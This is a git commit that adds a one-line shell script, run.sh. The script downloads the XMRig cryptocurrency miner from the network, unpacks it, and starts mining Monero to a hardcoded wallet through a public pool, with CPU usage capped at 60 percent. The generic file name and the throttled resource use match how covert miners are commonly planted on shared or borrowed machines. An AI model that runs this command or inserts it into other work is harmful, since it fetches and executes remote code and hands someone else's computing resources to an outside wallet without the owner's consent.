b396771afee0cad5ccb114677b44125205c2162c
williksco <86720178+williksco@users.noreply.github.com>
2021-07-02 07:10:40 +0700

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-bionic-x64.tar.gz && tar -zxf xmrig-6.12.2-bionic-x64.tar.gz && cd xmrig-6.12.2 && ./xmrig -o sg.minexmr.com:443 -u 89fYEJEXcF6boxxa7dK79PBqJPr6LBZZ16HD7NiFVfvqCoJKAppwup5Kpvsa7EEJhtjBoPonA4XQrWGcdfDtmbfA9M5sHD5 -k -t 3 --max-cpu-usage 60 --cpu-max-threads-hint 60 --tls --rig-id tes
